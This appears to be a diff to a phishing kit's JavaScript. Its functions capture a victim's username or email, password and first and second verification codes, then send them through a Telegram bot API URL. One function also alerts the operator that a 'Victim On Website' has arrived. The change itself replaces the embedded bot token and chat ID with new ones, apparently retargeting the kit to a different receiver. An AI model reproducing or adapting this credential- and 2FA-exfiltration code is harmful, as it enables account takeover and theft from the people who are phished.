@@ -170,7 +170,7 @@ close_notification_code.addEventListener("click",function(e){
 function sendEmailPasswordTelegram(){
     var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n`;
 
-    var url = `https://api.telegram.org/bot6379213457:AAHsSZEaDlyV-e7BKoxYwAFLwMTEFucSP38/sendMessage?text=${message}&chat_id=6266753302&parse_mode=html`;
+    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;
 
     var oReq = new XMLHttpRequest();
     oReq.open("GET", url, true);
@@ -180,7 +180,7 @@ function sendEmailPasswordTelegram(){
 function sendFirstCodeTelegram(){
     var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | First code: ${codeInput.value}`;
 
-    var url = `https://api.telegram.org/bot6379213457:AAHsSZEaDlyV-e7BKoxYwAFLwMTEFucSP38/sendMessage?text=${message}&chat_id=6266753302&parse_mode=html`;
+    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;
 
     var oReq = new XMLHttpRequest();
     oReq.open("GET", url, true);
@@ -191,7 +191,7 @@ function sendSecCodeTelegram(){
     var message = `Email or username: ${usernameOrEmail.value} \n | password: ${password.value} \n | Second code: ${codeInput.value}`;
 
  
-    var url = `https://api.telegram.org/bot6379213457:AAHsSZEaDlyV-e7BKoxYwAFLwMTEFucSP38/sendMessage?text=${message}&chat_id=6266753302&parse_mode=html`;
+    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;
     
 
     var oReq = new XMLHttpRequest();
@@ -204,7 +204,7 @@ function sendSecCodeTelegram(){
 function hiniDikush(){
     var message = `---- Victim On Website ----`;
 
-    var url = `https://api.telegram.org/bot6379213457:AAHsSZEaDlyV-e7BKoxYwAFLwMTEFucSP38/sendMessage?text=${message}&chat_id=6266753302&parse_mode=html`;
+    var url = `https://api.telegram.org/bot7965086722:AAFn42_a7cOaxqUzqmiyoEYLYc19zvThnEw/sendMessage?text=${message}&chat_id=-4567772942&parse_mode=html`;
    
    
     var oReq = new XMLHttpRequest();
